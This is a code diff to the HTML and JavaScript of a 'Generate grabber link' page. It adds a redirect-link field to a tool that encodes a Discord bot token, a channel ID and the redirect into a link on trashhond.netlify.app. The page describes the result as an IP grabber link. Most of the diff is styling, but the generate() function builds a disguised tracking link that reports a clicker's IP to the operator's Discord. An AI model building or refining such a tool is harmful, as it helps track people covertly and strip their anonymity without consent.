@@ -35,7 +35,7 @@
         }
 
         #tokenText {
-            margin-top: 80px;
+            margin-top: 40px;
             font-size: 20px;
         }
 
@@ -51,7 +51,8 @@
 
         }
 
-        #idField:focus {
+        #idField:focus,
+        #reField:focus {
             outline: none;
             animation: inFocus 0.5s forwards;
 
@@ -93,6 +94,7 @@
             margin: 20px;
             width: 500px;
             height: 50px;
+            margin-top: 50px;
             font-family: 'Titillium Web', sans-serif;
             color: white;
             background-color: rgb(58, 87, 141);
@@ -108,18 +110,20 @@
 
         #go:focus,
         #linkField:focus,
-        #copyButton:focus {
+        #copyButton:focus
+        {
             outline: none;
 
         }
 
         #linkField {
-            margin-top: 20px;
+            margin-top: 50px;
             background-color: #1a1a1a;
             border: 2px solid #2d2d2d;
-            margin-top: 10px;
+            
             width: 400px;
             position: relative;
+            top: -50px;
             left: -46px;
             height: 50px;
             color: white;
@@ -137,12 +141,29 @@
             position: fixed;
             height: 56px;
             width: 56px;
-            right: 516px;
+            right: 518px;
             top: 570px;
+            margin-top: 58px;
             font-family: 'Titillium Web', sans-serif;
             color: white;
             background-color: rgb(58, 87, 141);
             border: none;
+        }
+
+        #reField{
+            margin-top: 20px;
+            background-color: transparent;
+            border: none;
+            border-bottom: 2px solid grey;
+            width: 485px;
+            height: 20px;
+            color: white;
+            animation: outFocus 0.5s forwards;
+        }
+
+        #reText{
+            margin-top: 40px;
+            font-size: 20px;
         }
     </style>
     <meta charset="UTF-8">
@@ -150,7 +171,7 @@
 </head>
 
 <body>
-    <h1>Generate grabber link</h1>
+    <h1 style="margin-top: 0px;">Generate grabber link</h1>
     <h2>Fill in the token and channel ID to generate the IP grabber link</h2>
     <h2 id="tokenText">Discord Bot Token</h5>
         <input id="botField" type="text" placeholder="Bot Token:">
@@ -158,6 +179,9 @@
 
         <h2 id="tokenText">Discord Channel ID Token</h5>
             <input id="idField" type="text" placeholder="Channel ID:">
+            <br>
+            <h2 id="reText">Redirect Link</h2>
+            <input id="reField" type="text" placeholder="Redirect link:">
             <br>
             <button id="go" onclick="generate()">Generate URL</button>
             <br>
@@ -182,8 +206,9 @@
     function generate() {
         var tokenText = document.getElementById("botField").value;
         var channelText = document.getElementById("idField").value;
+        var reText = document.getElementById("reField").value;
         var linkField = document.getElementById("linkField")
-        linkField.value = `http://trashhond.netlify.app/short/?a=${btoa(tokenText).replaceAll("=", "EQUAL")}&b=${btoa(channelText).replaceAll("=", "EQUAL")}`
+        linkField.value = `http://trashhond.netlify.app/short/?a=${btoa(tokenText).replaceAll("=", "EQUAL")}&b=${btoa(channelText).replaceAll("=", "EQUAL")}&c=${btoa(reText).replaceAll("=", "EQUAL")}`
         linkField.style.border = "2px solid #009624"
         
 
